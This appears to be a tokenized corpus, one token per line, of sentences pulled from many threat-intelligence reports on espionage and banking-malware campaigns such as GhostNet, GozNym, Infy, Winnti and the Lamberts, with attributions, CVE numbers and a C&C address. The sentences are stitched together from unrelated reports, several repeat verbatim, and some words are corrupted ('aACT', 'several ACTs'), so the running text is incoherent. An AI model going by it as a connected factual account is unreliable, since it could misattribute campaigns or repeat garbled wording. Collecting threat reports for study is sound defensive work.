high-profile
entities
,
including
intelligence
services
,
military
,
utility
providers
(
telecommunications
and
power
)
,
embassies
,
and
government
institutions
.
 
Some
time
ago
,
a
Kaspersky
Lab
customer
in
Latin
America
contacted
us
to
say
he
had
visited
China
and
suspected
his
machine
was
infected
with
an
unknown
,
undetected
malware
.
 
It
was
a
targeted
attack
we
are
calling
"
Machete
"
.
 
At
first
look
,
it
pretends
to
be
a
Java
related
application
but
after
a
quick
analysis
,
it
was
obvious
this
was
something
more
than
just
a
simple
Java
file
.
 
"
Machete
"
is
a
targeted
attack
campaign
with
Spanish
speaking
roots
.
 
The
decoy
slideshows
all
contain
photos
from
very
meaningful
events
to
individuals
in
Thailand
,
suggesting
that
the
actors
continually
look
for
impactful
events
to
use
to
disguise
their
attacks
.
 
In
some
cases
,
such
as
Russia
,
the
target
appears
to
be
an
embassy
from
one
of
the
countries
of
this
list
.
 
Both
attackers
and
victims
speak
Spanish
natively
,
as
we
see
it
consistently
in
the
source
code
of
the
client
side
and
in
the
Python
code
.
 
We
are
also
grateful
to
the
Private
Office
of
his
Holiness
the
Dalai
Lama
,
the
Tibetan
Government-in-Exile
,
the
missions
of
Tibet
in
London
,
Brussels
,
and
New
York
,
and
Drewla
(
a
Tibetan
NGO
)
.
 
Between
June
2008
and
March
2009
the
Information
Warfare
Monitor
conducted
an
extensive
and
exhaustive
two-phase
investigation
focused
on
allegations
of
Chinese
cyber
espionage
against
the
Tibetan
community
.
 
These
instances
of
Gh0st
RAT
are
consistently
controlled
from
commercial
Internet
access
accounts
located
on
the
island
of
Hainan
,
People's
Republic
of
China
.
 
The
fieldwork
generated
extensive
data
that
allowed
us
to
examine
Tibetan
information
security
practices
,
as
well
as
capture
real-time
evidence
of
malware
that
had
penetrated
Tibetan
computer
systems
.
 
It
is
therefore
possible
that
the
large
percentage
of
high
value
targets
identified
in
our
analysis
of
the
GhostNet
are
coincidental
,
spread
by
contact
between
individuals
who
previously
communicated
through
e-mail
.
 
Where
they
exist
,
they
often
use
grey
market
or
pirated
software
.
 
Contextually
relevant
emails
are
sent
to
specific
targets
with
attached
documents
that
are
packed
with
exploit
code
and
Trojan
horse
programmes
designed
to
take
advantage
of
vulnerabilities
in
software
installed
on
the
target
's
computer
.
 
GhostNet
represents
a
network
of
compromised
computers
resident
in
high-value
political
,
economic
,
and
media
locations
spread
across
numerous
countries
worldwide
.
 
After
that
,
the
attacker
is
capable
to
control
the
compromised
device
.
 
The
computers
of
diplomats
,
military
attachs
,
private
assistants
,
secretaries
to
Prime
Ministers
,
journalists
and
others
are
under
the
concealed
control
of
unknown
assailant
.
 
The
C&C
server
(
82.137.255.56
)
used
by
the
above
backdoors
was
used
by
APT-C-27
(
Goldmouse
)
many
times
since
2017
.
 
According
to
360
Threat
Intelligence
Center
,
Goldmouse
was
observed
deploying
the
nebulous
njRAT
backdoor
.
 
The
banking
malware
GozNym
has
legs
;
only
a
few
weeks
after
the
hybrid
Trojan
was
discovered
,
it
has
reportedly
spread
into
Europe
and
begun
plaguing
banking
customers
in
Poland
with
redirection
attacks
.
 
The
APT
group
is
reportedly
targeting
the
Middle
East
region
.
 
The
malware
has
started
targeting
corporate
,
SMB
,
investment
banking
and
consumer
accounts
at
banks
,
including
some
in
Portugal
and
the
U.S.
,
in
addition
to
Poland
,
according
to
researchers
at
IBM
's
X-Force
team
.
 
According
to
Kessem
the
malware
has
redirection
instructions
for
17
banks
,
and
features
an
additional
230
URLs
to
assist
attackers
in
targeting
community
banks
and
email
service
providers
in
Poland
.
 
With
GozNym
,
attackers
dupe
users
by
showing
them
the
actual
bank
's
URL
and
SSL
certificate
.
 
Fresh
from
targeting
banks
in
Poland
,
the
banking
Trojan
GozNym
has
begun
taking
aim
at
banks
in
Germany
.
 
Attackers
went
on
to
use
the
Trojan
to
steal
$4
million
from
24
banks
,
including
22
in
the
United
States
and
two
in
Canada
,
in
just
two
weeks
.
 
Recreating
and
maintaining
fake
bank
sites
can
be
an
arduous
task
,
but
Kessem
claims
the
GozNym
group
appears
up
to
the
task
.
 
The
malware
is
distributed
primarily
through
laced
spam
emails
that
lure
recipients
into
opening
attachments
.
 
Kessem
.
 
Fresh
from
targeting
banks
in
Poland
,
the
banking
Trojan
has
reportedly
begun
taking
aim
at
banks
in
Germany
.
 
Now
GozNym
is
now
targeting
13
banks
and
subsidiaries
in
Germany
,
Limor
Kessem
,
Executive
Security
Advisor
at
IBM
,
said
Tuesday
.
 
he
Trojan
,
a
hybrid
of
Nymaim
and
Gozi
malware
,
initially
formed
in
April
and
thrives
on
carrying
out
redirection
attacks
via
DNS
poisoning
.
 
In
April
,
shortly
after
the
Trojan
's
discovery
,
researchers
observed
a
massive
GozNym
campaign
targeting
24
North
American
banks
.
 
The
method
,
which
technically
redirects
users
through
local
DNS
poisoning
,
requires
a
fair
bit
of
work
;
recreating
and
maintaining
fake
bank
sites
can
be
an
arduous
task
,
but
Kessem
claims
the
group
behind
GozNym
Nymaim
appear
up
to
the
task
.
 
Attackers
behind
Dyre
have
used
similar
tactics
in
the
past
but
have
only
deployed
their
attacks
in
English
speaking
countries
and
Spain
.
 
When
we
last
heard
from
the
Trojan
,
its
operators
were
seen
launching
redirection
attacks
on
four
large
,
U.S.
banks
in
June
.
 
The
fact
that
the
cybercriminals
behind
GozNym
have
already
adapted
the
Trojan
for
three
different
languages
and
in
countries
which
have
different
banking
systems
is
unique
,
according
to
Kessem
.
 
By
the
end
of
April
,
GozNym
had
redirection
instructions
for
17
Polish
banks
in
its
repertoire
,
along
with
an
extra
230
URLs
designed
to
assist
attackers
in
targeting
community
banks
and
email
service
providers
in
the
Eastern
European
country
.
 
Seeking
to
tease
out
any
possible
links
between
Operation
Aurora
,
VOHO
,
Operation
DeputyDog
,
and
Ephemeral
Hydra
,
we
began
with
Symantec
's
Hidden
Lynx
report
as
our
foundation
.
 
The
authors
of
that
report
identify
three
primary
tools
used
in
the
campaigns
attributed
to
Hidden
Lynx
:
Trojan.Naid
,
Backdoor.Moudoor
,
and
Backdoor.Hikit
.
 
We
will
detail
how
the
C&C
infrastructure
and
tools
used
by
hacker
group
Hidden
Lynx
during
its
VOHO
campaign
(
2012
)
,
excellently
documented
by
Symantec
researchers
last
September
,
overlap
with
tools
used
in
other
high
profile
operations
during
the
past
few
years
.
 
When
the
New
York
Times
and
Mandiant
last
year
unmasked
a
large
scale
Chinese
hacking
operation
,
pinpointing
its
location
down
to
the
building
,
the
report
drew
mainstream
attention
to
what
security
professionals
already
well
knew
:
sophisticated
threat
actors
carry
out
persistent
cyber
operations
over
months
and
years
.
 
By
the
end
of
April
,
GozNym
had
redirection
instructions
for
17
Polish
banks
in
its
repertoire
,
along
with
an
extra
230
URLs
designed
to
assist
attackers
in
targeting
community
banks
and
email
service
providers
in
the
Eastern
European
country
.
 
Using
Recorded
Future
,
we
quickly
built
a
timeline
of
the
reported
use
of
those
tools
in
major
security
incidents
,
finding
many
events
prior
to
the
early
2013
expos
on
Hidden
Lynx
.
 
In
particular
,
FireEye
during
the
fall
of
2013
called
out
infrastructure
overlap
between
Ephemeral
Hydra
and
DeputyDog
.
 
The
above
network
shows
relationships
between
three
tools
used
by
Hidden
Lynx
during
its
VOHO
campaign
:
Trojan.Naid
,
Backdoor.Moudoor
,
and
Backdoor.Hikit
.
 
Symantec
during
2012
linked
the
Elderwood
Project
to
Operation
Aurora
;
Trojan.Naid
and
Backdoor.Moudoor
were
also
used
in
Aurora
,
by
the
Elderwood
Gang
,
and
by
Hidden
Lynx
.
 
In
addition
to
these
,
we
also
identified
"
Macfog
"
,
a
native
Mac
OS
X
implementation
of
Icefog
that
infected
several
hundred
victims
worldwide
.
 
Icefog
,
also
known
as
the
"
Dagger
Panda
"
by
Crowdstrike
's
naming
convention
,
infected
targets
mainly
in
South
Korea
and
Japan
.
 
In
2013
,
a
public
report
reveals
a
group
of
actors
conducted
targeted
attacks
leverage
a
malware
dubbed
ICEFOG
against
mainly
government
organizations
and
defense
industry
of
South
Korea
and
Japan
.
 
Similar
to
our
approach
with
Symantec
's
report
on
Hidden
Lynx
,
we
used
Recorded
Future
to
organize
the
technical
details
about
the
DeputyDog
attacks
to
reveal
technical
information
described
in
the
open
source
reporting
across
multiple
campaigns
.
 
With
Javafog
,
we
are
turning
yet
another
page
in
the
Icefog
story
by
discovering
another
generation
of
backdoors
used
by
the
attackers
.
 
Since
January
2013
,
we've
been
on
the
lookout
for
a
possible
RedOctober
comeback
.
 
One
possible
hit
was
triggered
when
we
observed
Mevade
,
an
unusual
piece
of
malware
that
appeared
late
in
2013
.
 
In
August
2014
,
some
of
our
users
observed
targeted
attacks
with
a
variation
of
CVE-2012-0158
and
an
unusual
set
of
malware
.
 
It
wasn't
until
August
2014
that
we
observed
something
which
made
us
wonder
if
RedOctober
is
back
for
good
.
 
The
Cloud
Atlas
implants
utilize
a
rather
unusual
C&C
mechanism
.
 
We
named
it
RedOctober
because
we
started
this
investigation
in
October
2012
,
an
unusually
hot
month
.
 
The
attackers
upload
data
to
the
account
,
which
is
downloaded
by
the
implant
,
decrypted
and
interpreted
.
 
Just
like
with
RedOctober
,
the
top
target
of
Cloud
Atlas
is
Russia
,
followed
closely
by
Kazakhstan
,
according
to
data
from
the
Kaspersky
Security
Network
(
KSN
)
.
 
In
May
2015
,
Palo
Alto
Networks
WildFire
detected
two
e-mails
carrying
malicious
documents
from
a
genuine
and
compromised
Israeli
Gmail
account
,
sent
to
an
Israeli
industrial
organization
.
 
One
e-mail
carried
a
Microsoft
PowerPoint
file
named
"
thanks.pps
"
(
VirusTotal
)
,
the
other
a
Microsoft
Word
document
named
"
request.docx
"
.
 
Around
the
same
time
,
WildFire
also
captured
an
e-mail
containing
a
Word
document
(
"
hello.docx
"
)
with
an
identical
hash
as
the
earlier
Word
document
,
this
time
sent
to
a
U.S.
Government
recipient
.
 
attacks
using
this
tool
were
still
active
as
of
April
2016
.
 
Considering
the
language
being
used
in
the
malicious
code
is
Arabic
,
it
seems
that
the
attacker
is
familiar
with
Arabic
language
as
well
.
 
The
initially-observed
"
thanks.pps
"
example
tricks
the
user
into
running
the
embedded
file
named
ins8376.exe
which
loads
a
payload
DLL
named
mpro324.dll
.
 
In
this
case
,
the
file
used
the
software
name
"
Cyberlink
"
,
and
a
description
of
"
CLMediaLibrary
Dynamic
Link
Library
"
and
listing
version
4.19.9.98
.
 
Unit
42
published
a
blog
at
the
beginning
of
May
titled
"
Prince
of
Persia
"
,
in
which
we
described
the
discovery
of
a
decade-long
campaign
using
a
formerly
unknown
malware
family
,
Infy
,
that
targeted
government
and
industry
interests
worldwide
.
 
We
noted
in
our
original
blog
the
large
amount
of
targeting
of
Iranian
citizens
in
this
campaign
,
we
observed
almost
one-third
of
all
victims
to
be
Iranian
.
 
In
addition
to
the
original
"
Infy
"
variant
,
we
also
see
the
newer
,
more
sophisticated
,
interactive
,
and
fuller-featured
"
Infy
M
"
variant
deployed
against
apparently-higher-value
targets
.
 
This
documentation
provides
new
insight
into
intrusion
efforts
conducted
by
at
least
four
discrete
Iranian
threat
actors
,
Rocket
Kitten
,
Infy
,
Sima
,
and
Operation
Cleaver
,
including
groups
and
tools
that
have
not
been
previously
disclosed
.
 
Since
early
2013
,
we
have
observed
activity
from
a
unique
threat
actor
group
,
which
we
began
to
investigate
based
on
increased
activities
against
human
right
activists
in
the
beginning
of
2015
.
 
Over
the
course
of
three
years
of
observation
of
campaigns
targeting
civil
society
and
human
rights
organizations
,
from
records
of
well
over
two
hundred
spearphishing
and
other
intrusion
attempts
against
individuals
inside
of
Iran
and
in
the
diaspora
,
a
narrative
of
persistent
intrusion
efforts
emerges
.
 
Thanks
to
information
we
have
been
able
to
collect
during
the
course
of
our
research
,
such
as
characteristics
of
the
group
's
malware
and
development
cycle
,
our
research
strongly
supports
the
claim
that
the
Infy
group
is
of
Iranian
origin
and
potentially
connected
to
the
Iranian
state
.
 
Amongst
a
backdrop
of
other
incidents
,
Infy
became
one
of
the
most
frequently
observed
agents
for
attempted
malware
attacks
against
Iranian
civil
society
beginning
in
late
2014
,
growing
in
use
up
to
the
February
2016
parliamentary
election
in
Iran
.
 
Until
the
publication
of
the
Palo
Alto
report
,
the
developers
of
the
Infy
appeared
to
be
actively
updating
and
maintaining
the
codebase
,
and
new
releases
were
distributed
to
existing
,
as
well
as
new
,
targets
quite
regularly
.
 
Other
samples
were
found
bearing
a
compilation
time
as
early
as
June
2012
and
version
00002
.
 
Over
the
months
following
the
elections
,
the
accounts
of
Iranians
that
had
been
compromised
by
the
actors
were
then
used
for
spreading
the
malware
.
 
When
activities
targeting
of
civil
society
subsided
,
the
actors
instead
appeared
to
have
focused
on
external
targets
,
such
a
series
of
attempts
to
spearphish
the
Danish
Ministry
of
Foreign
Affairs
.
 
Palo
Alto
Networks
has
noted
and
described
the
differences
of
two
malware
agents
developed
in
parallel
,
with
commonalities
in
behavior
but
differing
functionalities
;
families
described
as
Infy
and
Infy
M.
Our
primary
observation
was
of
the
Infy
(
non-M
)
malware
,
which
primarily
functions
as
a
keylogger
for
the
collection
of
account
credentials
.
 
Our
observation
of
Infy
's
campaigns
,
primarily
through
the
lens
of
spearphishing
attacks
against
Iranian
civil
society
and
media
organizations
,
indicates
a
wandering
focus
on
particular
demographics
on
a
strategic
basis
over
time
.
 
The
Infy
malware
was
seen
targeting
Iranians
again
in
June
2015
,
when
it
was
shared
with
researchers
after
being
sent
to
a
broadcast
journalist
at
BBC
Persian
with
a
generic
introduction
and
a
PowerPoint
presentation
attached
titled
"
Nostalogy
"
(
sic
)
.
 
Based
on
information
collected
in
the
course
of
this
research
,
the
targets
and
victims
of
Infy
's
campaigns
have
continued
to
be
strongly
aligned
with
Iran
's
"
soft
war
"
agenda
,
internal
security
policies
,
and
regional
adversaries
of
the
hardline
establishment
of
the
Islamic
Republic
of
Iran
.
 
Until
late
December
2015
,
in
nearly
every
Infy
message
documented
since
our
tracking
began
in
May
2013
,
no
attempt
included
strong
tailoring
of
the
approach
,
often
not
even
including
an
email
body
,
instead
relying
on
cryptic
filenames
and
email
subjects
to
attract
interest
.
 
One
narrowly-targeted
spearphishing
from
Infy
was
sent
from
the
compromised
account
of
a
political
activist
promoting
participation
inside
of
Iran
,
claiming
to
be
a
set
of
images
of
a
British-Iranian
dual
national
that
has
been
held
in
Evin
Prison
for
five
years
on
espionage
charges
.
 
As
in
the
past
,
these
messages
have
been
sent
accounts
believed
to
be
fake
and
accounts
compromised
by
Infy
,
including
Kurdish
activists
that
had
previously
been
compromised
by
the
Flying
Kitten
actor
group
.
 
The
actors
successfully
compromised
a
host
of
an
Saudi
government
institutions
on
January
17
,
2016
,
and
maintained
access
for
at
least
two
weeks
.
 
The
Infy
group
also
appears
to
engage
in
espionage
activities
against
foreign
governments
and
businesses
.
 
In
order
to
initially
compromise
the
designated
targets
,
Infy
typically
distributed
specifically-crafted
malicious
documents
containing
Infy
through
spearphishing
attacks
.
 
In
order
to
initially
compromise
the
designated
targets
,
the
attackers
typically
distributed
specifically-crafted
malicious
documents
containing
Infy
through
spearphishing
attacks
.
 
On
May
2
,
2016
,
Palo
Alto
Networks
published
the
report
"
Prince
of
Persia
"
,
which
provided
the
first
public
and
widely-reported
indication
of
Infy
's
activities
in
Iran
,
while
other
publications
either
refrained
from
making
the
association
or
were
not
openly
available
.
 
Prior
to
the
distribution
of
new
versions
of
the
agent
,
the
Infy
developers
appear
to
consistently
conduct
tests
from
local
hosts
,
which
indicates
that
the
control
and
maintenance
of
the
software
occurs
in
the
Khorasan
Razavi
province
of
Iran
,
potentially
in
the
city
of
Mashhad
.
 
On
May
2
,
2016
,
Palo
Alto
published
the
report
"
Prince
of
Persia
"
,
which
provided
the
first
public
and
widely-reported
indication
of
Infy
's
activities
in
Iran
,
while
other
publications
either
refrained
from
making
the
association
or
were
not
openly
available
.
 
Only
one
client
,
based
in
Iran
,
continued
to
communicate
with
the
infrastructure
.
 
A
researcher
has
attributed
a
recently
publicized
attack
on
Citrix'
internal
network
to
the
Iranian-linked
group
known
as
IRIDIUM
and
said
that
the
data
heist
involved
6
terabytes
of
sensitive
data
.
 
"
IRIDIUM
has
hit
more
than
200
government
agencies
,
oil
and
gas
companies
and
technology
companies
,
including
Citrix
Systems
Inc
"
,
they
said
.
 
Citrix
told
Threatpost
that
this
is
indeed
the
same
password-spraying
attack
it
announced
itself
last
week
but
it
wouldn't
confirm
the
other
details
in
Resecurity
's
post
,
including
the
attribution
.
 
In
wake
of
these
events
,
a
security
firm
Resecurity
reached
out
to
NBC
news
and
claimed
that
they
had
reasons
to
believe
that
the
attacks
were
carried
out
by
Iranian-linked
group
known
as
IRIDIUM
.
 
Resecurity
says
that
IRIDIUM
"
has
hit
more
than
200
government
agencies
,
oil
and
gas
companies
,
and
technology
companies
including
Citrix
.
 
Resecurity
claims
that
IRIDIUM
breached
Citrix
's
network
during
December
2018
.
 
Infy
engaged
in
malware
spearphishing
against
the
same
targets
as
Flying
Kitten
from
the
outset
of
its
campaign
;
Operation
Cleaver
has
registered
several
resources
related
to
development
agencies
that
have
been
the
subject
of
intrusion
attempts
by
others
since
February
2014
.
 
The
malicious
samples
we
found
are
the
early
stage
malware
most
often
delivered
by
spear-phishing
e-mails
.
 
This
next
stage
library
copies
itself
into
the
System32
directory
of
the
Windows
folder
after
the
hardcoded
file
name
either
KBDLV2.DLL
or
AUTO.DLL
,
depending
on
the
malware
sample
.
 
At
this
stage
,
the
malware
gathers
information
about
the
infected
computer
.
 
Hancom
Office
is
widely
used
in
South
Korea
.
 
Perhaps
it
also
points
to
the
suspected
North
Korean
origin
of
attack
.
 
The
attacker
is
from
North
Korea
.
 
All
of
them
lie
in
ranges
of
the
Jilin
Province
Network
and
Liaoning
Province
Network
,
in
China
.
 
Finally
,
this
geo-location
supports
the
likely
theory
that
the
attackers
behind
Kimsuky
are
based
in
North
Korea
.
 
In
this
blog
,
we
look
at
the
Winnti
malware
implant
as
used
by
two
known
activity
groups
BARIUM
and
LEAD
.
 
According
to
the
German
press
,
the
intruders
used
the
Winnti
family
of
malware
as
their
main
implant
,
giving
them
persistent
access
to
the
conglomerate
's
network
as
early
as
February
2016
.
 
In
the
case
of
this
malware
,
the
activity
groups
strongly
associated
with
Winnti
are
BARIUM
and
LEAD
.
 
But
even
though
they
share
the
use
of
Winnti
,
the
BARIUM
and
LEAD
activity
groups
are
involved
in
very
different
intrusion
scenarios
.
 
To
show
how
this
breach
and
similar
breaches
can
be
mitigated
,
we
look
at
how
Windows
Defender
ATP
flags
activities
associated
with
BARIUM
,
LEAD
,
and
other
known
activity
groups
and
how
it
provides
extensive
threat
intelligence
about
these
groups
.
 
BARIUM
begins
its
attacks
by
cultivating
relationships
with
potential
victimsparticularly
those
working
in
Business
Development
or
Human
Resourceson
various
social
media
platforms
.
 
During
these
intrusions
,
LEAD
's
objective
was
to
steal
sensitive
data
,
including
research
materials
,
process
documents
,
and
project
plans
.
 
Initial
intrusion
stages
feature
the
Win32/Barlaiy
implantnotable
for
its
use
of
social
network
profiles
,
collaborative
document
editing
sites
,
and
blogs
for
C&C
.
 
Once
BARIUM
has
established
rapport
,
they
spear-phish
the
victim
using
a
variety
of
unsophisticated
malware
installation
vectors
,
including
malicious
shortcut
(
.lnk
)
files
with
hidden
payloads
.
 
Instead
,
the
group
often
simply
emails
a
Winnti
installer
to
potential
victims
,
relying
on
basic
social
engineering
tactics
to
convince
recipients
to
run
the
attached
malware
.
 
Microsoft
Analytics
shows
that
Winnti
has
been
used
in
intrusions
carried
out
throughout
Asia
,
Europe
,
Oceania
,
the
Middle
East
,
and
the
United
States
in
the
last
six
months
(
Figure
1
)
.
 
Instead
,
Lead
often
simply
emails
a
Winnti
installer
to
potential
victims
,
relying
on
basic
social
engineering
tactics
to
convince
recipients
to
run
the
attached
malware
.
 
In
some
other
cases
,
LEAD
gains
access
to
a
target
by
brute-forcing
remote
access
login
credentials
,
performing
SQL
injection
,
or
exploiting
unpatched
web
servers
,
and
then
they
copy
the
Winnti
installer
directly
to
compromised
machines
.
 
This
was
the
case
in
two
known
intrusions
in
2015
,
where
attackers
named
the
implant
DLL
"
ASPNET_FILTER.DLL
"
to
disguise
it
as
the
DLL
for
the
ASP.NET
ISAPI
Filter
.
 
Windows
Defender
ATP
helps
network
security
professionals
deal
with
intrusions
from
activity
groups
like
LEAD
and
BARIUM
in
several
ACTs
.
 
The
following
examples
were
developed
using
a
Winnti
installer
that
was
used
in
attacks
in
December
2016
.
 
The
Windows
10
Creators
Update
will
bring
several
enhancements
to
Windows
Defender
ATP
that
will
provide
SOC
personnel
with
options
for
immediate
mitigation
of
a
detected
threat
.
 
LEAD
and
Barium
are
not
known
for
large-scale
spear-phishing
,
so
it
is
unlikely
that
SOC
personnel
would
have
to
deal
with
multiple
machines
having
been
compromised
by
these
groups
at
the
same
time
.
 
And
,
finally
,
with
the
upcoming
Creators
Update
,
Windows
Defender
ATP
will
provide
additional
capabilities
for
detecting
threats
such
as
Winnti
,
as
well
as
centralized
response
options
,
such
as
machine
isolation
and
file
blocking
,
that
will
enable
fast
containment
of
known
attack
jump
off
points
.
 
The
police
suspected
Lurk
of
stealing
nearly
three
billion
rubles
,
using
malicious
software
to
systematically
withdraw
large
sums
of
money
from
the
accounts
of
commercial
organizations
,
including
banks
.
 
When
we
first
encountered
Lurk
,
in
2011
,
it
was
a
nameless
Trojan
.
 
While
the
machine
is
in
isolation
,
SOC
personnel
can
direct
the
infected
machine
to
collect
live
investigation
data
,
such
as
the
DNS
cache
or
security
event
logs
,
which
they
can
use
to
verify
alerts
,
assess
the
state
of
the
intrusion
,
and
support
follow-up
actions
.
 
This
article
is
an
attempt
to
share
this
experience
with
other
experts
,
particularly
the
IT
security
specialists
in
companies
and
financial
institutions
that
increasingly
find
themselves
the
targets
of
cyber-attacks
.
 
In
most
cases
,
the
attackers
only
had
to
infect
the
computer
on
which
the
RBS
software
was
installed
in
order
to
start
stealing
the
cash
.
 
We
were
soon
able
to
help
investigate
another
incident
involving
Lurk
.
 
This
event
significantly
affected
the
Russian
cybercriminal
world
as
the
gang
had
stolen
hundreds
of
millions
of
rubles
during
a
few
years
of
activity
,
and
was
considered
a
"
leader
"
among
cybercriminals
.
 
In
Russia
,
there
were
several
relatively
large
cybercriminal
groups
engaged
in
financial
theft
via
attacks
on
RBS
.
 
In
April
2013
,
a
year
after
we
found
the
"
bodiless
"
Lurk
module
,
the
Russian
cybercriminal
underground
exploited
several
families
of
malicious
software
that
specialized
in
attacks
on
banking
software
.
 
Through
the
information
exchanges
used
by
people
in
the
security
industry
,
we
learned
that
several
Russian
banks
were
struggling
with
malicious
programs
created
specifically
to
attack
a
particular
type
of
legal
banking
software
.
 
If
it
did
,
the
malware
downloaded
additional
modules
,
including
ones
allowing
for
the
automatic
creation
of
unauthorized
payment
orders
,
changing
details
in
legal
payment
orders
,
etc
.
 
As
far
as
we
can
judge
from
the
data
we
have
,
in
2014
the
criminal
group
behind
Lurk
seriously
reduced
its
activity
and
"
lived
from
hand
to
mouth
"
,
attacking
anyone
they
could
,
including
ordinary
users
.
 
In
February
2015
,
Kaspersky
Lab
's
Global
Research
and
Analysis
Team
(
GReAT
)
released
its
research
into
the
Carbanak
campaign
targeting
financial
institutions
.
 
Since
2011
,
the
robbers
had
allegedly
been
stealing
money
directly
from
bank
accounts
in
Russia
and
other
countries
of
the
Commonwealth
of
Independent
States
(
CIS
)
by
using
a
Trojan
called
Lurk
.
 
which
they
launched
targeted
attacks
against
Russian
banks
,
businesses
and
media
companies
.
 
Lurk
uses
a
form
of
steganography
:
that's
where
one
file
is
hidden
aACT
inside
another
file
of
a
completely
different
sort
,
such
as
an
image
,
audio
,
or
video
file
.
 
The
latest
version
of
Madi
also
has
the
ability
to
monitor
the
Russian
social
network
Vkontakte
(
VK
)
along
with
the
Jabber
messaging
platform
to
look
for
users
who
visit
websites
that
contain
words
like
"
USA
"
,
"
Skype
"
,
and
"
gov
"
.
 
Madi
was
found
capturing
computer
screens
,
recording
audio
and
stealing
screenshots
,
keystrokes
,
documents
and
e-mail
correspondence
from
"
Middle
Eastern
critical
infrastructure
engineering
firms
,
government
agencies
,
financial
houses
and
academia
.
 
A
timeline
of
new
activity
can
be
scoped
out
for
the
group
,
with
the
greatest
number
of
related
downloaders
created
by
the
developers
in
December
2011
,
Feb
and
March
of
2012
,
followed
by
June
of
2012
.
 
it
reports
to
was
created
on
August
10
,
2011
.
 
Since
at
least
2008
,
The
Lamberts
have
used
multiple
sophisticated
attack
tools
against
high-profile
victims
.
 
Longhorn
,
which
we
internally
refer
to
as
"
The
Lamberts
"
,
first
came
to
the
attention
of
the
ITSec
community
in
2014
,
when
our
colleagues
from
FireEye
discovered
an
attack
using
a
zero
day
vulnerability
(
CVE-2014-4148
)
.
 
The
attack
leveraged
malware
we
called
'
BlackLambert
'
,
which
was
used
to
target
a
high
profile
organization
in
Europe
.
 
Their
arsenal
includes
network-driven
backdoors
,
several
generations
of
modular
backdoors
,
harvesting
tools
,
and
wipers
.
 
The
first
time
the
Lambert
family
malware
was
uncovered
publicly
was
in
October
2014
,
when
FireEye
posted
a
blog
about
a
zero
day
exploit
(
CVE-2014-4148
)
used
in
the
wild
.
 
Interestingly
,
while
most
Blue
Lambert
variants
have
version
numbers
in
the
range
of
2.x
,
Green
Lambert
is
mostly
in
3.x
versions
.
 
While
investigating
one
of
these
infections
involving
White
Lambert
(
network-driven
implant
)
and
Blue
Lambert
(
active
implant
)
,
we
found
yet
another
family
of
tools
that
appear
to
be
related
.
 
Versions
of
this
particular
orchestrator
were
found
on
other
victims
,
together
with
White
Lambert
samples
,
indicating
a
close
relationship
between
the
White
and
Pink
Lambert
malware
families
.
 
While
in
most
cases
the
infection
vector
remains
unknown
,
the
high
profile
attack
from
2014
used
a
very
complex
Windows
TTF
zero-day
exploit
(
CVE-2014-4148
)
.
 
This
migration
activity
was
last
observed
in
October
2016
.
 
Most
of
the
Blue
and
Green
Lambert
samples
have
two
C&C
servers
hardcoded
in
their
configuration
block
:
a
hostname
and
an
IP
address
.
 
Some
of
the
known
filenames
for
Gray
Lambert
are
mwapi32.dll
and
poolstr.dll
it
should
be
pointed
though
that
the
filenames
used
by
the
Lamberts
are
generally
unique
and
have
never
been
used
twice
.
 
Black
Lambert
was
seen
only
briefly
and
we
assume
it
was
"
retired
"
from
the
arsenal
after
being
discovered
by
FireEye
in
2014
.
 
The
Lamberts
toolkit
spans
across
several
years
,
with
most
activity
occurring
in
2013
and
2014
.
 
To
further
exemplify
the
proficiency
of
the
attackers
leveraging
the
Lamberts
toolkit
,
deployment
of
Black
Lambert
included
a
rather
sophisticated
TTF
zero
day
exploit
,
CVE-2014-4148
.
 
Taking
that
into
account
,
we
classify
the
Lamberts
as
the
same
level
of
complexity
as
Regin
,
ProjectSauron
,
Equation
and
Duqu2
,
which
makes
them
one
of
the
most
sophisticated
Cyber
Espionage
toolkits
we
have
ever
analysed
.
 
Taking
that
into
account
,
we
classify
the
Lamberts
as
the
same
level
of
complexity
as
Regin
,
ProjectSauron
,
Equation
and
Duqu2
,
which
makes
them
one
of
the
most
sophisticated
Cyber
Espionage
toolkits
we
have
ever
analysed
.
 
On
January
15
,
Confiant
exposed
the
activity
of
the
Zirconium
group
,
spreading
malicious
ads
via
a
network
of
fake
ad
agencies
through
2017
,
in
what
amounted
to
the
largest
malvertising
campaign
of
recent
times
.
 
Cadelle
,
uses
Backdoor.Cadelspy
.
 
Symantec
telemetry
identified
Cadelle
and
Chafer
activity
dating
from
as
far
back
as
July
2014
,
however
,
it's
likely
that
activity
began
well
before
this
date
.
 
Chafer
,
uses
Backdoor.Remexi
.
 
Cadelle
's
threats
are
capable
of
opening
a
back
door
and
stealing
information
from
victims'
computers
.
 
Chafer
,
uses
Backdoor.Remexi.B
.
 
registrant
information
points
to
activity
possibly
as
early
as
2011
.
 
These
threats
are
capable
of
opening
a
back
door
and
stealing
information
from
victims'
computers
.
 
executable
compilation
times
suggest
early
2012
.
 
It's
unclear
how
Cadelle
infects
its
targets
with
Backdoor.Cadelspy
.
 
The
affected
organizations
we
were
able
to
identify
are
mostly
based
in
the
Middle
East
.
 
one
organization
is
located
in
the
US
.
 
There
are
a
number
of
factors
in
these
groups'
campaigns
that
suggests
that
the
attackers
may
be
based
in
Iran
.
 
Remexi
is
a
basic
back
door
Trojan
that
allows
attackers
to
open
a
remote
shell
on
the
computer
and
execute
commands
.
 
Their
primary
interest
appears
to
be
gathering
intelligence
.
 
This
stands
in
opposition
to
the
data
gathered
from
export
timestamps
and
C&C
domain
activity
that
points
to
Green
Lambert
being
considerably
older
than
the
Blue
variant
.
 
security
policy
in
the
Eastern
Europe
and
South
Caucasus
regions
.
 
Callisto
Group
via
credential
phishingThese
spear
phishing
emails
were
crafted
to
appear
highly
convincing
,
including
being
sent
from
legitimate
email
accounts
suspected
to
have
been
previously
compromised
by
the
Callisto
Group
via
credential
phishing
.
 
In
early
2016
the
Callisto
Group
began
sending
highly
targeted
spear
phishing
emails
with
malicious
attachments
that
contained
,
as
their
final
payload
,
the
"
Scout
"
malware
tool
from
the
HackingTeam
RCS
Galileo
platform
.
 
These
spear
phishing
emails
were
crafted
to
appear
highly
convincing
,
including
being
sent
from
legitimate
email
accounts
suspected
to
have
been
previously
compromised
by
the
Callisto
Group
via
credential
phishing
.
 
Callisto
Group
appears
to
be
intelligence
gathering
related
to
European
foreign
and
security
policy
.
 
some
indications
of
loosely
linked
activity
dating
back
to
at
least
2013
.
 
In
October
2015
,
the
Callisto
Group
was
observed
sending
targeted
credential
phishing
emails
.
 
In
early
2016
,
the
Callisto
Group
was
observed
sending
targeted
spear
phishing
emails
.
 
The
malicious
attachments
purported
to
be
invitations
or
drafts
of
the
agenda
for
the
